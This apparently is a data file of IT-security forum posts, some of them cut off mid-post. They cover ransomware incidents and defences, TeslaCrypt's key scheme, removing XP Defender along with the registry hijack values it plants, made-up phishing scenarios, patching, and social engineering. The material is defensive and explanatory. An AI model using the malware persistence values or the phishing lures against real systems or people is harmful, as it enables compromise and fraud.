When I finish this course next July I will have had to have thought of an idea as to what i will complete my dissertation on in my final year. I know its a long time away still but i'd rather be ahead of the game now seeing as i'll have to do a lot of extra reading and research for whatever topic I choose. The course in studying is Forensic Computing and Security which has been eye opening and interesting, i'm just unsure where to take it in a research sense.I prefer the security side of the course as i feel its more relevant and provides greater opportunities in the future but i still enjoy the forensics and most the time the two subjects compliment one another. My coding skills are far from being considered good but i have a very basic knowledge. This makes it difficult for me to contemplate creating a product as part of my dissertation (my tutor said this is good and if it works then marks are easier to come by) so I'm swaying towards a straight written essay with some practical research woven in.I've skim read some ideas such as lifeless malware, how different malware can have a financial impact on businesses (I studied business in college and thus this appeals to me), or cloud security, but I'm just curious as to what you guys would recommend having been in the field and know whats relevant both now and for the futureMy Main Questions:Striaght Dissertation or Dissertation with Project?Topic of Subject?Areas to look for inspiration / tools that would be helpfulThanks in advance!",0

439165,﻿ Contractor & Partner Collaboration v Network Security–do you have to choose?,"It is important that there becollaboration between employees, suppliers, and partners, but onemust weigh the risk of giving people who are not employees access to yoursystems, as data can easily be lost through theft, carelessness, or malware. How could you measure such risk and apply due diligence when making thedecision to do so?Access versus Security - do you have to choose?When the American banking giantWachovia failed in the Great Recession, the bank was taken over by WellsFargo.  The two bank’s employees could not send encrypted email betweeneach other, because Wachovia used Lotus Notes and Wells Fargo used Microsoft Outlook(Exchange).  It is possible to send encrypted mail between these two emailsystems, but not easy for the end user to do so.  Rather than address thisproblem, the bank chose to ignore it for several years, deeming it not worththe effort, since all the employees would eventually more to the domainWellsFargo.com.Here is an instance of a companychoosing productivity over security.  It would have been more secure forthe bank—a business that deals in highly-private financial matters—to sendemails encrypted.  But it would have been less productive to do so, giventhe definition of productivity we give below.How could Wells Fargo have approachedthis issue?  Like any other business decision, that should be consideredon risk-versus-reward (cost-versus-benefit) basis.If you want a mechanical approach fordetermining this, you could grant access only when reward > risk.  Thatis what the auditors would say.  To do this, you would need to translaterisk and reward into numbers.The reward of granting access isincreased productivity.  Productivity is:productivity= (output per employee) /number of employeesThe definition of “output”varies.  It could be the number of support calls handled, sales dollaramount, widgets built, shorter time-to-market, and so forth.What about risk?  If you followthe COBIT 5 framework for governance, you know that the company is supposed tokeep a risk profile.  That means each type of data is assigned a scorebased on how it would impact the business, if this data were lost. So you canquantify risk.If you don’t want to resort tomathematics, just keep this thinking in mind, as you make thesedecisions.  Here are some inputs to that model.Possible Risks including Network SecurityThe benefits of using collaborationare fairly obvious.  People working on the same project should have accessto the same data and be able to communicate easily.  But what are some ofthe risks? This new blog post outlines some of the risks and how to mitigateagainst them.

2172800,What not to do after a data breach,"It's an IT department's worst nightmare. Your business has been compromised by a third party that has accessed your sensitive, confidential data. According to a 2018 study, US companies take an average of 221 days to detect a breach. After getting breached, here's what you should avoid:Don't panic!Step back, take a breath, and evaluate the situation. Inform management immediately, Calmly present them with as much info as you have about the breach and discuss next steps.Don't react without a planTell your team to hold tight, refer to the emergency plan and procedure guide that maps out who is responsible for what, and make sure they document every action they take as they go along. (And get the guides prepared in advance!)Don't hesitate to hire an external cybersecurity teamMany SMBs don't hire external security services because it's not in the budget. But if a breach is so bad that your business could go under, it's worth the investment.Don't keep quietIt may be tempting to only share breach data info to upper management or to staff on a need-to-know basis. But the entire company should be informed, as well as vendors and customers who might be affected as well.Don't sugarcoat the situationBe honest about what happened. Transparency is key. Along these lines, proactively contact key vendors and customers and be sure to arm your customer service team with detailed info so they can best help your customers.Don't neglect your cybersecurity regulationsEvery state has different security breach notification laws, so no matter where you're located, chances are good that you'll have to report a breach to the local authorities.Don't rushYour team is probably working around the clock and they may be tempted to knock out and close tickets quickly because it looks like you're making progress. Every fix needs to be checked and triple-checked after a breach, even if it slows things down.Don't skip the post-mortemThe crisis seems to be over, but it's not time to go back to business as usual yet. At the end of the remediation process, it's important to learn from your mistakes and improve security in the future. This could involve investing in additional cybersecurity products or software, and restructuring your IT to increase protection for the most sensitive data.Don't forget to train your employeesEmployees are the weakest link in cybersecurity breaches. Once things have settled down, implement or revise your all-staff cybersecurity training with the knowledge you've gained from this breach.Have you been affected by a breach and do you have any tips?",12

1985155,So my friend was hit with ransomeware its a .wallet one,So I have tried several of the apps from places like Kaspersky and on noramsomware.org I check to see if there was a decrypter for it. There are places online claiming they can decrypted it but I wouldn't trust them. I went through most of the computer to see if they hid the code in it. Sniffed packets with wireshark to trace them. I couldn't find anything to help me decrypted his machine. The last backup he has is from a month ago. His IT guy he has in my opinion is horrible. He didn't have a back up system set up in place nor does he have a firewall on his network.This is also the second time this has happened in a year. The last back up he has is from a month ago and doesn't even know the software his IT guy is using. I don't have time to take him on as client nor do I know how his software is setup for his dental office because its specific to the dental industry. Has anyone heard of a tool to decrypted this one yet. People have posted on forums that they have but I haven't seen any concrete evidence that supports this yet. I am giving him to my buddy as a client to deal with it. I don't like mixing friendships with work.Update.So he paid the ransom of $3k in bitcoins they sent him the decrypter in two parts a program and scanner for the machine. The key to unlock the files is over a over a page of text. The files have been decrypted but at the boot up of the machine it started to encrypted again so some file got re encrypted then had to decrypted them again. As of now hard drive is pulled out of machine in a dock being cloned so they can figure out where the ransomware is stored on the computer to stop it from spreading when booted again. So about 94% of the files are decrypted.  They thought they deleted the file but they were wrong. ,0

I opened multiple tickets with them with no resolution. The firewall vendor stated that he thought the traffic was initiated from the inside. So I started looking at open connections to my domain controller (most important server in my network) by running netstat -ano. This returned over 5500 active connections to the server. How can I determine if these connections are legitimate or not? How can I remove them. Also, how did they get there?

1171457,Welcome to the July edition of the Symantec Intelligence report!,"Hey Spicefriends... I'm a little late on this one, but it's still great info to arm yourself with. The July edition of the Symantec Intelligence report is here! (It was published in August, so I'm not THAT late...) Dig it:Symantec Intelligence Report July 2015﻿Last month we reported how the spam rate had dropped below 50 percent of email traffic. Almost as if in response to this seemingly watershed moment, the spam rate went up slightly in July, just crossing the midpoint mark again with a percentage of 50.1. While this is the first time the spam rate have increased in more than a year, we still anticipate that the rate will continue its slow, downward trajectory in the months to come. The Manufacturing and Wholesale industries both saw significant increases in targeted attack activity in July, where both industries were up eight percentage points from June. Enterprises with more than 2500 employees were the most commonly targeted organization size during the month. The number of vulnerabilities disclosed was up as well in July. There were 579 vulnerabilities reported, in comparison to 526 in June. Of particular note were six zero-day vulnerabilities discovered during the month—the highest number seen in more than a year. Four of these zero-day vulnerabilities—three for Adobe Flash Player and one for Microsoft Windows— were discovered in the data cache of the Italian covert surveillance and espionage software company, Hacking Team, which suffered a data breach in early July. There were 53.7 million new pieces of malware discovered in July. While down slightly from June, this is still well above the 40.3 million average seen over the last twelve months. Ransomware has also declined slightly this month, though there have been modest increases in the amount of crypto-ransomware seen in July. There was also a slight decrease in malware detected in email traffic during the month, though the Agriculture, Forestry, & Fishing industry remained on top of the list of sectors most likely to receive malicious emails. In contrast, four mobile malware families were released onto the mobile malware landscape in July, the highest number seen in one month during 2015. The number of mobile malware variants also continues to trend upwards, where 42 Android malware variants were seen per family during July.﻿Lots of news! Go grab the report and give it a look.

The hallmark feature of the software, however, is how that information is protected – an action movie-style countdown to self-destruction.Whomever you decide to send information, Digify gives that recipient a finite amount of time to view the file before removing it from the device completely. There are no direct download links, no storing of files on the Digify servers; once the timer is up, the file is gone.The security measures don't stop there, though. The app converts any files sent into a special format in its time on the Digify servers. Additionally, recipients cannot screenshot within the app, and you can revoke access to anyone at will.Digify users can send multiple file formats, including PDF, Word, Excel, Powerpoint, and photos, with more to come in the future. Digify is free in respective app stores and is currently in the beta phase for Windows platforms.In short, Digify seems like a grown-up version of Snapchat. You can read more about it on Digify's website: http://www.digify.com/﻿So, do you ever see yourself using this app?

Save, reload, look, interfaces are dead like they should be.So I guess, I'm completely lost on where to look and why nothing showed up in the firewall, and was this an attack or was it something else.I know it's kind of a shot in the dark without seeing my equipment and that but give me anything you've got.Thanks guys.",5

1670506,Poll: How often do you apply security updates?,"To patch, or not to patch? In a perfect world, applying security updates across your systems and networks would be something everyone does immediately. And while security patches should be applied as soon as possible, many IT pros are unable to do so because of real-world considerations. For one, some patches can break more things than they fix. Some applications can stop working, for instance, after a Windows update. Other applications might go unsupported after an organization moves from Windows 7 to Windows 10. This isn't new: There are some organizations that are still using Windows XP because of legacy applications that require the older operating system. According to Windows Security, ""Most large enterprises with big IT departments have protocols in place for testing patches before deploying them to the entire network."" For smaller companies, however, IT departments ""don't always have the luxury of sufficient personnel and hardware to site up and maintain a test lab environment."" Some IT departments have consequently adopted a ""wait and see"" approach, where they'll delay ""patch installation for a week or two in order to let someone else be the 'guinea pig.'"" Regardless of when you apply patches, it's always best to do it with a strategy in mind. Considering the costs and benefits of applying a security patch, for instance, can lead to a more informed decision. It's also wise to have a way to rollback your systems in the event things don't go as planned. In short, it's always smart to know that patching your systems carries a risk which might be extra work, lost productivity, or extra costs. But postponing vital security patches also carries the risk of a security breach. ",0

However, the security of SSH-based automated access has been largely ignored to date”.An SSH process running under a patch management system, it continues, will be given things root access to accounts or administrator-level access to the Oracle database. Security is, therefore, critical.As always, the most important security considerations fall under the heading of “normal security practice”: NIST points to the vulnerabilities in old versions of SSH to recommend proper patch management; user accounts need to be managed and deleted if they're not required. SSH client/server configurations need to be watched, and keys need to be continually monitored and audited.",11

1505184,TeslaCrypt Ransomware v3.01 Updated With Unique Keys For Each Victim,"TeslaCrypt is a relatively new ransomware variant which has made it in the Top 5, and has rapidly innovated in its efforts to evade detection. The latest version which is one of the most sophisticated ransomware strains out there, lets criminals use unique file encryption keys for each infected victim, eliminating the possibility that one single key could be used to unlock different victims.The folks at the Cisco Talos blog have reversed engineered this latest version and if you are into crypto they have a tough cryptographic journey waiting for you.  Fasten your seatbelts. They start out by explaining in a simplified way how the real encryption algorithm of TeslaCrypt 3 works. Here is a picture:﻿First the adversaries generate the public key (Pb) and include it in the ransomware binary file which later on infects the PC (Alice).The ransomware on the infected PC (we call it Alice from now on) can now calculate a random value (ka). This means Alice has everything to calculate the shared secret (S = Pb * ka). Alice now encrypts all files with a temporarily generated AES key.Alice then encrypts this temporary AES key with the (x-coordinate of the) shared secret (S) from step 3. We will call this encrypted AES key the 'recovery key'.Now the trick: after the encryption is done, Alice's private key (ka) and the shared secret (S) is deleted. This means that Alice can no longer calculate the shared secret(S) using the equation S = Pb * ka to decrypt the recovery key. BUT, the shared secret can still be restored by using the equation from Bob's side: S = Pa * kb. Unfortunately, Alice does not have Bob’s (the C&C server) private key (kb). Only the C&C server has it. This means only the C&C server can perform the calculation. Alice (the victim) pays the ransom and sends her public key (Pa) to the C&C server. Now it can send the calculated shared secret back to Alice to decrypt the recovery key.In practice TeslaCrypt 3 is using a more complex implementation. Read the article at Talos! ﻿http://blog.talosintel.com/2016/03/teslacrypt-301-tales-from-crypto.html﻿",0

Have fun reading, and I will try to report back in 12 months which ones came out as real.---1) The Registry Hack---A mid-size Credit Union's controller shares on Facebook that she is expecting a baby. She has a detailed profile on LinkedIn, and also creates a baby registry at Amazon. She receives an email from Amazon's marketing department that they want to interview her about the registry and that she can choose one of her registry items for free. She clicks on the link. Her workstation gets infected with a Trojan and the bad guys transfer $495,000 to the Ukraine over a long weekend.---2) Legal File Corruption---In-house counsel of a large defense contractor, working long days on a corruption lawsuit against a former VP Sales works closely with their outside attorneys when the case comes to trial. She receives an email from her counterpart who complains the email server of his office is down and if she can email him the case file immediately as he's on his way to court. The file is used by the competition to steal away a large deal.---3) PCI Compliance Failure---A system administrator gets an email from their credit card merchant account processor that his company has failed their PCI compliance and that their card processing will be shut down in 24 hours unless he immediately reports on the recent vulnerability scan what was done. A link is provided to confirm which patches have been applied. The system admin clicks and his workstation gets infected with a zero-day exploit that gives the bad guys the keys to the kingdom: admin credentials!---4) Underperformance Review ---Dozens of employees in a healthcare company get an email from their CEO who is asking to participate in an anonymous ""How Are We Doing?"" survey. The CEO explicitly asks for feedback on herself, and also if the employee please rate the performance of their direct supervisor. 65% of the employees click on the link and all of their workstations get infected causing the IT team four days of twenty-hour frantic wipe & rebuild time.---5) iPhone Pwned ---A CEO of a non-profit shares on LinkedIn he really likes the new iPhone with fingerprint recognition. A few weeks later he gets a text message from Apple that there is an important update of the fingerprint software, and that he should do that as soon as possible. It will require a reboot of his phone though. He complies right away, but what gets installed is mobile malware that steals the credentials of his office VPN. Bad guys add phantom employees to their payroll and they lose $15,000 to money mules in Direct Deposit the next Friday.---6) Celebrity Trap---The VP Sales of a large online ticket reservation site gets an email from the lead singer of his favorite band, inviting him to meet & greet backstage after the coming gig they have in his town. He's all excited and clicks on the link. That one click is enough to let the bad guys in, and exfiltrate their database with 275,000 full customer credit card transactions. Cha-Ching!---7) Credit Card Security Con---The wife of a mid-size bank's President gets a phone call from their credit card company. The rep explains they are offering a new security service, to make sure their account is resistant against cyber attacks. This service will send a text to her phone if there is a fraudulent charge, so she can tap ""no"" on the phone if she wants to dispute the charge. The rep asks her to type a domain name in her browser so she can get her cell phone subscribed to the new service. The domain is malicious and drops a Trojan on her PC which allows the bad guys to take over the home network, and infect the laptop of her husband who plugs it in the bank's network during the week. The bank itself gets penetrated that way, and $2 Million gets transferred to Russia out of the bank's customer accounts.---8) Broken Cloud---A few years ago, Chinese government-sponsored hackers opened a front office in the US and carefully developed it into a well-funded, up & coming cloud consultancy firm. They keep working at it, impressing cloud providers with whitepapers showing their in-depth knowledge of cloud security. They even hire unwitting US employees that have security clearance.Finally they get invited by Amazon for a possible contracting job. They get access to the premises, are invited for a tour of the data center and manage to plug a small device in the ethernet jack of a conference room phone for a few seconds. That allows them to subtly sabotage that data center and write another whitepaper describing the specific problem. Next, they sit back and wait until they are called. Finally the call comes, they move in to ""assist"" and obtain full ownership of the cloud.---9) PDF Deception---The CIO of a large insurance company gets a call from an attractive sounding recruiter, stating that he's been selected for an interview to discuss a CEO position at an online competitor. He has not heard of the recruiting firm but checks out the rep on LinkedIn. It all seems legit and she's a looker. As part of the procedure, the CIO gets a PDF with a description of the company that is interested in him. The PDF does not open up for some reason and he closes the reader. He retries but the PDF fails again. You guessed it. There was a Trojan inside and his workstation is pnwed, allowing very valuable confidential information to be exfiltrated.---10 Top Dog Social Engineer---A man crafts a new web portal and establishes trust with new users, helping them to get ahead socially by sharing personal and work details, habits, and preferences. He collects all of this data, allows targeted advertising, and even goes public. It's unbelievable that he gets away with this when identity theft has become rampant and not giving out personal information is top priority. In case you did not guess, the Top Dog social engineer is Mark Zuckerberg, founder and CEO of Facebook. A billion people fell for his ruse.

2080067,How to Get Rid of Ransomware at No Cost,"Ransomware is one of the biggest scourges we face as Internet citizens today. What happens when you have been struck by it? The most obvious option would be to pay the ransom. You would not be alone if you did – even large companies and non-profits have had to pay, or at least negotiate, a ransom. But should that be your first option? Hardly.Why Are Ransomware Attacks so Successful?The core reason for ransomware “success” is the sophisticated manner of attack. Hackers create smart campaigns based on social behavior insights. Moreover, technology enables them to hide encryption software in almost any document. Imagine getting an email that includes the text “If the encoding of the attached Word document seems incorrect, please activate macros. This is done as follows…”Another reason lies in the weakness of IT networks’ security policies. Factors such as inadequate backups, the lack of disaster recovery plans, poor updates of operating systems and applications, inadequate control over changes in IT infrastructure and user permissions, and lack of employee security education and training can all put organizations at serious risk of ransomware encryption.How to Fix ransomware: Practical Tips and Free Tools 1) Have good backups. The best defense is a good offense – having good backups. This can come in a couple of forms.Shadow copies. If you are a Windows administrator, you may be familiar with the Volume Shadow Copy Service, a piece of software, first introduced in Windows Server 2003, that takes snapshots of data on specifically configured volumes at predetermined points in time. This service informs the Previous Versions feature in Windows client, which allows users to right-click a file on the disk and open a previous version if, for example, they make a mistake in a spreadsheet. If you catch a ransomware infection early, shadow copies are likely a good way to restore an unencrypted version of your files. If you are not using shadow copies, configure them today. Unfortunately, some variants of ransomware have caught onto this procedure. During their silent infection process, prior to encrypting files, they delete all shadow copies found on a disk.Regular backups that you restore from a tape or archive disk. You are making regular backups of your storage system, right? And you are regularly testing them to verify the files can be restored intact? If not, then stop reading right now and go configure a backup scheme. If you are, then rest a little easier, as the worst case for a ransomware infection in this case would be wiping your machines and restored their data from backups. Sure, it is an investment of time, but you will absolutely not need to pay any ransom, and you might just be seen as a hero. 2) Look for available free anti-ransomware tools. If you do find yourself on the other end of a completed ransomware attack, you have a couple of options that don’t involve paying the ransom.As governments and security researchers continue to make progress against ransomware threats, these parties have managed to break the encryption schemes used by some variants of ransomware. It is important to keep in mind that not every variant of ransomware has been “broken” by the good guys, so you should not rely solely on the hope that these encryption schemes have been foiled. Do not rest on your laurels when it comes to building defenses against this type of attack.If you have already been victimized, then head over to the No More Ransom Project at https://www.nomoreransom.org and look for the variant you have been hit with. This site is sponsored jointly by the European Cybercrime Center, Politie, Kaspersky Lab, and Intel Security, and contains current decryption tools for the following variants:CrysusMarsjoke/PolyglotWildfireChimeraTeslacryptShadeCoinvaultRannohRakhni The aforementioned organizations are working on breaking other variants as well, but breaking good encryption takes time, and malware creators have a perverse incentive to make their encryption stronger and even more difficult to break. It is an unfortunate dance, but for now, you might be able to save yourself with the decryption tools on the site. Beware of ransomware removal tools from other sources—they may actually be ransomware disguised as a prevention tools.3) Use the File Server Resource Manager to catch bad actors. Even if you have been infected by ransomware, it is not too late to prevent further damage. You will likely have some encrypted files, but the sooner you stop the spread of the infection, the fewer files end up being held hostage, and the easier your cleanup task is. As we have covered on this blog before, you can use the tool built into Windows Server called File Server Resource Manager to catch ransomware attacks as they happen. Essentially, you create a honeypot share with a dollar sign in front of the name to fool ransomware into starting with that particular share in its efforts to encrypt files. Let the group Authenticated Users have full control of this share so that any process wanting to write to the share can do so. This is not a drop box for other files, so do not publicize this share to actual users; its only legitimate use is to catch things that should not be on your systems. When the File Server Resource Manager screen notices activity happening within that share, it assumes that someone has been infected and will cut off that user’s access to any share to stop the encryption attack in its tracks. There is a simple PowerShell script that can be fired by the File Server Resource Manager in order to accomplish this:Get-SmbShare -Special $false | ForEach-Object { Block-SmbShareAccess -Name $_.Name -AccountName '[Source Io Owner]' -Force }Once these permissions have been removed, ransomware cannot access files for encryption, and basically just stop. You can then remove the malware, restore the files that were encrypted, and move on with your life.For much more detail on this method of stopping a pending attack or an attack that has just begun, check out Ransomware Protection Using FSRM and PowerShell on our blog.What are your ways to fight ransomware?

557535,Tweaking.com saved the day,"I have a customer who was using an the free 2011 AVG AntiVirus on his 4 office PCs. Of course the all became infected. After many hours of cleaning these PCs, they of course were not working well, which is typical when you pull viruses out. I was pulling the last remaining hairs from my forehead doing various registry hacks and and running Microsoft FixIt scripts, I remembered a utility that I read about a long time ago but had never tried. It took me a bit to remember the words to use in the search engine but I was able to find it. After reading the release notes on the current release I felt comfortable in trying it. What did I have to lose, I was most likely going to have to reload these PCs one at a time anyway!On 3 PCs, I ran this utility one time but there was on one PC that I ran it twice. I may not have needed too but because it had error-ed out multiple times on the first run. Long story short. Every PC was fixed and the customer said that they had never ran that fast before. Of course most people forget how fast a brand new PC is but it was a good feeling to hear it.This utility is free but I ended up donating to them. The amount of savings for the customer in rebuilds and my aggravation was tremendous. The site says that the utility is a last ditch effort but I just ran it on a Win8 machine that was having intermittent sound problems, not a hardware problem but a browser problem. There were three browsers installed, IE 11, Firefox and Chrome and you might get audio when you opened a video on one site, go to a different site and it again was a toss of the coin. Closing then restarting the browser might fix it but there seemed to be no logic as to what was causing the problem or how to resolve it. I uninstalled and reinstalled JAVA, Flash Player, the Sound software, the sound driver with no luck. Once I ran this utility the audio problem went away.Note that I cleaned these PCs by removing AVG 2011 using the AVG removal tool. Prior to the reboot, I used CCleaner to stop startup apps that were suspicious. After the reboot, I used VipreRescue and Malwarebytes to clean the nasties off. Because I am a GFI MAX user (I am an MSP) I installed Vipre once everything was done.From the visual windows that open during its run, it looks to be a culmination of a Registry fixes that would take you hours to perform manually. This app does it in about 10 min max.http://www.tweaking.com/content/page/windows_repair_all_in_one.htmlI think that I will attempt running this on a PC that I would typically refresh to see if it does as good of a job as performing a reload of the OS every couple of years!!!﻿",11

93144,XP Defender,"Ok here is another removal tip for the evil malware XP Defender. XP Defender was the most sophisticated malware I have had to fight yet. FYI malawarebytes could not detect any instances of this program. Also XP Defender will not allow you to run any exe, because it replaces all exe to point to itself, so even if you close the process, as soon as you call upon your trusted anti-anything it will respawn. After respawning you will be plagued by pop ups, browser redirects and so forth. The process that you need to terminate is ave.exe once that is gone you will need to open your registry and start deleting keys. Also you are editing registry so you can really screwing things up here, I am not responsible for this. You have been warned.Ok down to buisness here are the registry keys.HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center ""FirewallOverride"" = ""1?HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center ""AntiVirusOverride"" = ""1?HKEY_LOCAL_MACHINE\SOFTWARE\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command ""(Default)"" = ""%UserProfile%\Local Settings\Application Data\ave.exe"" /START ""%Program Files%\Internet Explorer\iexplore.exe""HKEY_LOCAL_MACHINE\SOFTWARE\Clients\StartMenuInternet\FIREFOX.EXE\shell\safemode\command ""(Default)"" = ""%UserProfile%\Local Settings\Application Data\ave.exe"" /START ""%Program Files%\Mozilla Firefox\firefox.exe"" -safe-modeHKEY_LOCAL_MACHINE\SOFTWARE\Clients\StartMenuInternet\FIREFOX.EXE\shell\open\command ""(Default)"" = ""%UserProfile%\Local Settings\Application Data\ave.exe"" /START ""%Program Files%\Mozilla Firefox\firefox.exe""HKEY_CLASSES_ROOT\secfile\shell\open\command ""(Default)"" = ""%UserProfile%\Local Settings\Application Data\ave.exe"" /START ""%1? %*HKEY_CLASSES_ROOT\.exe\shell\open\command ""(Default)"" = ""%UserProfile%\Local Settings\Application Data\ave.exe"" /START ""%1? %*HKEY_CURRENT_USER\Software\Classes\secfile\shell\open\command ""(Default)"" = ""%UserProfile%\Local Settings\Application Data\ave.exe"" /START ""%1? %*HKEY_CURRENT_USER\Software\Classes\.exe\shell\open\command ""(Default)"" = ""%UserProfile%\Local Settings\Application Data\ave.exe"" /START ""%1? %* One final note you will have to reassociate your .exe to point to applications, once this is done, because you will be deleting that hijacked key.",0
679463,Crypto-Ransomware: A different take on Prevention Methodology,"The topics of Ransomware and CryptoXYZ have become extremely prevalent both here, and in the IT wildnerness of the web.  I have analyzed an array of samples of all of the different types of Crypto software I could find, using a small isolated Windows 7 Enterprise VM, even mapping some fake network drives to a bunch of Zero'ed-Out data files, to attempt to catch the crypto-variant in the act.  What I've found in doing this, along with several other research sources is that the big-hitters in the crypto-game (CryptoWall and CryptoLocker), as well as the variant ""Cryptographic Locker"" are using _Microsoft Cryptographic API's_ to do their dirty work.  From the moment you examine a process, or an injected process of one of these three, you'll start seeing Reg Keys being written to and read from, in the context of things such as ""Microsoft Provider for Embedded RSA Crypt..."" ﻿you see where I'm going with this.  They are using built-in API's from the host Windows OS to accomplish their end-goal.Now, lets pretend your IT infrastructure has no need for this built-in crypto functionality within Windows.  Your organization does not encrypt data because it does not need to, the PC's are not using any sort of EFS.  I assume unless you are in the business of handling extremely sensitive data, you fall in this category.Would it then be safe to assume that by one of the following methods, a Crypto-outbreak could be detected and prevented?- Disable the service which provides access to these API's (If it is that simple)Or - a more robust solution:- Hook the API's of the cryptography functions of windows, and when one is called, redirect the parameters of the function, don't do anything, or terminate the calling process.Does anyone see any holes in this idea?  If so, let me know.  I'm trying to develop a solution for this, and would be releasing it to the general public if I could confirm it worked correctly.  Before I code too much more, I'd like to hear what others think so I can save myself the time if this is a dead-end I'm on here.I obtained the detailed information on which crypto method each variant is supposedly using in this Bromium Report p.16",0

2175417,2019 Security Budgets: Negotiating For Spend Increases,"With 2018 coming to a close and security issues on the rise worldwide, how are you currently preparing to address the issue of security budgeting for 2019?One of the many reasons contributing to a necessary increase in security spend is the impact of ransomware on SMBs. A survey from Datto show as many as 84 percent of surveyed managed service providers had an SMB client who’d been hit with ransomware from Q2 2016 to Q2 2017.On the other hand, as more businesses are moving more services to the cloud, more budget is being shifted away from traditional security and into application security and virtual versions of security products, as well as solutions that can protect IoT devices. Negotiating for IT budgets at small or mid-market companies is always a challenge and can be especially difficult if you’re asking for increased security spending from an executive who doesn’t understand the risks of being unprepared for a data breach. What is your advice for overcoming unawareness or reluctance in these budget discussions, and for getting security requests approved?

1507117,Two Factor Authentication on Remote Desktop Services 2012,"HiFirstly I apologise if this is in the wrong are but I couldn't decide if it was a Windows issues or a Security issues.So, I am having a massive issue at the moment. I have searched all over the Internet and I keep drawing a blank.At my company we are currently implementing Remote Desktop Services to replace our aging Citrix setup. So in a test environment I have setup an all in one RDS server. So I'll paint a picture of our current network setup.Web Access/Gateway/Broker/Host server is sat on the domain working nicely for internal users (In this case, me and a few IT staff for testing)We then decided that it would be good if we was able to access this server from remote locations. So we have an ISA2006 server sat in our DMZ. I configured all this and there you go, we are able to access the internal server from a public address, access the Web Access page or RDP directly to the server using the public address.Now if it was just internally the standard AD Windows password would be fine but seen as we are planning on making this available for our users externally we would like an added bit of security. We currently have a VPN system which uses Vasco tokens to access the internal network, but ideally we would like to cut down on the VPN access so users can access this service from an PC anywhere. So what we would like is for them to have to use the same Vasco token to access the RDP session.On the ISA server, we have been able to set this up so the Web Access side of the RDS requests the Vasco information, however when a user clicks and downloads one of the RemoteApps then it fails to connect. It seems the RDP icon does not know what to do when the ISA server asks for a Token.Any thoughts on this?  I have tried this https://technet.microsoft.com/en-us/library/cc731249(WS.10).aspx but its does not seem to work with the RDP icon, in fact it doesn't get as far because I would normally get a request for a login page and when I followed this guide I just for a Firewall credentials issue which just confused me even more.﻿Any advise would be very much appreciated ",0

190621,Social Engineering -- The Elephant in the Room,"This is the 27th article in the Spotlight on IT series. If you'd be interested in writing an article on the subject of backup, security, storage, virtualization or MSPs for the series, PM Elise to get started.--------------------------------------------Wikipedia’s definition of Social Engineering is: “the art of manipulating people into performing actions or divulging confidential information. While it is similar to a confidence trick or simple fraud, the term typically applies to trickery or deception for the purpose of information gathering, fraud, or computer system access; in most cases the attacker never comes face-to-face with the victims.”I’m sure you all have cases you can recall where issues have occurred involving some detail, information or security that was breached using Social Engineering techniques. I’ve been married for more than 33 years and supporting my in-laws’ IT needs for most of that time. My mother in law, in her 80’s, was recently persuaded over the phone by a young man “claiming” to be from Microsoft to provide $285 on her credit card to resolve non-existent problems on her computer. After I explained to her that it was a scam and there was nothing at all wrong with her computer, they contacted her a second time and convinced her to pay yet more money, despite having been told they were cyber criminals and she had paid the money for nothing at all. Their ability to convince her to pay appears to have been better than my ability to show her and explain she had wasted her money. A poor example of business risk, but a very good example of how widespread and effective Social Engineering is, and how less proficient computer users and generally older people are at greater risk.Secure computing, network and internet use are subject to potentially serious problems (breaches) generated directly and indirectly by simple Social Engineering techniques. From users being persuaded to give their passwords to relative strangers, to receptionists being persuaded to allow unauthorized persons into secure areas of a business premises; these are a couple of the more common forms of Social Engineering for destructive, espionage and criminal intent.Risk assessment is a vital part of any security system, not just for IT. Yet many Risk Assessments do not include the risks generated by Social Engineering. Strong passwords and SSL VPNs mean nothing if users are willing to give out their passwords for any reason. While strong passwords and secure VPNs should be part of a secure plan, they should be supported by educating users in the risks associated with being prepared to provide their passwords to anyone else for any reason.Now obviously the risk of any Social Engineering attacks are going to vary based on the industry, location and size or profile of the business, but like any risk assessment the relative cost or damage from such an attack must also be considered. This damage could extend to loss of customer confidence, damage to production and/or delivery, all the way to risk to personal wellbeing, health and safety. Industries like Government, Infrastructure, Health, Finance and Banking, Military and Aerospace are at particular risk, but each business should make their own judgement about their risk and the likely vectors for any possible attacks.Piggybacking (and unauthorized outsider following authorised personnel through the door into a secure workplace), Phishing (web based), Smishing (SMS based), and Vishing (telephone based) are all common forms of Social Engineering and often effective techniques too. Piggybacking, which I see on almost a weekly basis, requires improvements in physical security and associated procedures, and these are often difficult to get accepted and even more difficult to enforce. Like many areas of security, the risk is not taken seriously until a breach has occurred and some noticeable damage done or cost incurred.CountermeasuresProtocols, Policies and/or Procedures for when, where and how sensitive information is handled and by whom. In many industries like those mentioned above, general guidelines and in some cases regulations and legislation governing handling and storing information exist and should be complied with or exceeded.Providing training to staff so they understand their relative risks and appropriate defence, in many cases this will also improve their personal security in respect to online banking and trading etc. This training should include the details of the protocols, policies and procedures relative to their job.Like confidence testing backups and DR plans, or pen testing networks and systems, regular testing of the policies and procedures, along with continuous improvement should occur. Staff should be tested fairly regularly especially if the risk, likelihood or potential cost/impact is high, to ensure the business is safe from the risk of Social Engineering.There is no single guideline that could cover all needs and situations, but this too should be developed based on the particular businesses assessment of the risks, likelihood and costs of any attack. Taking account of the likely vectors for an attack and developing suitable policies and procedures to reduce the risk, likelihood of a successful attack and of course try to limit the associated reach and/or cost if an attack was to occur.Using Social Engineering for goodThis is a twist on the use of Social Engineering, persuading people to take action they don’t feel is necessary or that they are not willing or interested in doing for the greater good. Particularly in Small Business where the budget/funding for security may only extend to a monitored alarm system on the office for out of hours periods, the risk has not been considered, let alone assessed as existent. It takes little effort and no real money to over a period of time convince users to use strong passwords rather than their first name or that of their spouse or child. Then in addition convincing them that it is no more right to give their password to a stranger than it is to provide their debit card PIN.SMEs on the other hand are generally aware there are risks and prepared to invest in assessment, policy, procedure and prevention; even when the risk and likelihood are considered low, but the cost if an incident/breach did occur could be very high.The Spiceworks community is another place you will see the lighter side of Social Engineering at work. Nic uses a very delicate touch in his management of the community, achieving a very friendly and welcoming environment for our sharing of information. I have for a long time considered the SpicePoints to be a form of Social Engineering on Spiceworks part, encouraging and promoting the contributions of my fellow SpiceHeads. All good if you ask me.We consider it part of our obligation as MSPs to try to help our clients prepare at least a little for what is the new global crime wave, Social Engineering. It is not at all hard to make this part of your MSP business if it’s not already.I have attached a draft list of Top Security Remedies and Mitigations to use as a starting point for discussion, based on my work last year on a number of Aerospace and military customer sites. I’ll be very interested to hear your stories and allegories about Social Engineering, please post any examples you’ve seen firsthand and any 